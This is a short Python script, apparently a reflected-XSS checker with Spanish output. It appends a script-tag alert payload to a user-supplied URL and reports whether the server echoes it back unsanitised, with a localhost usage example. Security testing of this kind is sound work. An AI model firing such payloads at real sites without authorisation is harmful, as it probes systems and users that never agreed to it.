import requests
import sys

def probar_xss(url_objetivo):
    payload = "<script>alert('AUDITORIA_XSS')</script>"
    objetivo = url_objetivo + payload

    print(f"\n[*] Probando inyección XSS en:\n    {objetivo}")
    print("-" * 60)

    try:
        respuesta = requests.get(objetivo, timeout=15)
        
        if payload in respuesta.text:
            print("[!] ¡VULNERABILIDAD DETECTADA! (XSS Reflejado)")
            print("[+] El servidor reflejó el código JavaScript sin sanitizar.")
        else:
            print("[OK] El servidor filtró o bloqueó el payload.")

    except Exception as e:
        print(f"[-] Error de conexión: {e}")

    print("-" * 60)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Uso: python3 escaner_xss.py <url_con_parametro>")
        print("Ejemplo: python3 escaner_xss.py \"http://localhost:8080/?q=\"")
    else:
        probar_xss(sys.argv.pop(1))
      
